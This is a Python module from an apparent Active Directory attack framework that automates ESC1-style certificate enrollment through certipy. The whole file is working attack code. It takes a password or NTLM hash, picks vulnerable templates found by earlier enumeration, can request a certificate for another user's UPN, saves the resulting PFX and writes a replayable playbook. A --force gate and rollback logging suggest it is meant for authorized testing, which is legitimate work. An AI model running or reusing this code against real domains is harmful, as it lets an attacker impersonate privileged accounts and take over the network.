"""AD CS certificate request — ESC1-style enroll (requires --force).

Attempts real enrollment via certipy when installed; always emits a playbook
and stores any resulting PFX in the session.
"""

from __future__ import annotations

import json
import subprocess
import sys
from typing import Any

from rich.console import Console

from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.registry import register_capability
from adaf_attack.core.rollback import record_pre_state
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="cert-request",
    summary="Request a certificate from AD CS (ESC1 enroll path); requires --force",
    category="credential-access",
    tags=("adcs", "esc1", "certificate", "enroll"),
    destructive=True,
)
class CertRequest:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        template = kwargs.get("template") or kwargs.get("cert_template")
        ca = kwargs.get("ca")
        alt_name = kwargs.get("alt_name") or kwargs.get("upn")

        console.print(f"[bold]Cert request[/bold] → {target.domain}")

        if not force:
            raise RuntimeError(
                "cert-request enrolls a certificate and requires --force. "
                "Pass --template (and optionally --ca / --alt-name)."
            )

        # Seed template/CA from prior adcs-enum if missing
        adcs_path = session.path("adcs-enum.json")
        adcs = None
        if adcs_path.exists():
            try:
                adcs = json.loads(adcs_path.read_text(encoding="utf-8"))
            except Exception:  # noqa: BLE001
                adcs = None

        if not template and adcs:
            cands = adcs.get("esc1_candidates") or []
            if cands:
                template = cands[0]
                console.print(f"[dim]Template from ESC1 candidates: {template}[/dim]")

        if not ca and adcs:
            cas = adcs.get("cas") or []
            if cas:
                # prefer cn / name field
                first = cas[0]
                ca = first.get("cn") or first.get("name") or first.get("display_name")
                if ca:
                    console.print(f"[dim]CA from adcs-enum: {ca}[/dim]")

        if not template:
            raise RuntimeError("No --template and no ESC1 candidates in session")
        if not target.username:
            raise RuntimeError("Username required for certificate request")

        result: dict[str, Any] = {
            "domain": target.domain,
            "template": template,
            "ca": ca,
            "alt_name": alt_name,
            "ok": False,
            "method": None,
        }

        user = target.username
        # certipy req
        cmd = [
            sys.executable,
            "-m",
            "certipy",
            "req",
            "-u",
            f"{user}@{target.domain}",
            "-dc-ip",
            target.dc_ip,
            "-template",
            template,
        ]
        if target.password:
            cmd.extend(["-p", target.password])
        elif target.hashes:
            cmd.extend(["-hashes", target.hashes])
        if ca:
            cmd.extend(["-ca", ca])
        if alt_name:
            cmd.extend(["-upn", alt_name])

        [
            f"# certipy req for {user}@{target.domain}",
            " ".join(
                c if c != target.password else "'***'"
                for c in cmd
                if not (isinstance(c, str) and c.startswith("-") and False)
            ),
        ]
        # cleaner playbook without password
        playbook_cmd = (
            f"certipy req -u '{user}@{target.domain}' -p '***' -dc-ip {target.dc_ip} "
            f"-template '{template}'"
            + (f" -ca '{ca}'" if ca else "")
            + (f" -upn '{alt_name}'" if alt_name else "")
        )
        playbook_path = session.path("cert-request.playbook.txt")
        playbook_path.write_text(playbook_cmd + "\n", encoding="utf-8")
        result["playbook"] = str(playbook_path)

        try:
            proc = subprocess.run(
                cmd,
                cwd=str(session.root),
                capture_output=True,
                text=True,
                timeout=180,
            )
            result["method"] = "certipy"
            result["returncode"] = proc.returncode
            result["stdout"] = (proc.stdout or "")[-3000:]
            result["stderr"] = (proc.stderr or "")[-3000:]
            # collect PFX outputs
            pfxes = list(session.root.glob("*.pfx"))
            if proc.returncode == 0:
                result["ok"] = True
                rollback = record_pre_state(
                    session,
                    kind="certificate-enroll",
                    target=f"{user}@{target.domain}",
                    attribute=template,
                    artifact=str(pfxes[-1]) if pfxes else None,
                    extra={"ca": ca, "alt_name": alt_name},
                )
                result["rollback"] = rollback
                if pfxes:
                    result["pfx"] = str(pfxes[-1])
                    console.print(f"  [green]Enrolled[/green] → {pfxes[-1]}")
                else:
                    console.print("  [green]certipy exited 0[/green] (check session for PFX)")
            else:
                console.print(f"  [yellow]certipy req failed[/yellow] rc={proc.returncode}")
                console.print(f"  {(proc.stderr or proc.stdout or '')[:500]}")
        except FileNotFoundError:
            result["method"] = "playbook-only"
            result["note"] = "certipy not installed; playbook written"
            console.print("  [yellow]certipy not installed — playbook only[/yellow]")
            console.print(f"  → {playbook_path}")
        except Exception as exc:  # noqa: BLE001
            result["error"] = str(exc)
            result["method"] = "error"

        # Graph note
        if result.get("ok"):
            node = f"USER@{(user or '').upper()}@{target.domain.upper()}"
            graph.add_node(node, "User", sam=user)
            graph.add_edge(node, node, "EnrolledCertificate", template=template)

        out_path = session.path("cert-request.json")
        out_path.write_text(json.dumps(result, indent=2, default=str), encoding="utf-8")
        graph.save(session.path("graph.json"))
        session.log("cert-request.complete", ok=result.get("ok"), template=template)
        console.print(f"Playbook → {playbook_path}")
        console.print(f"Results → {out_path}")
        return result
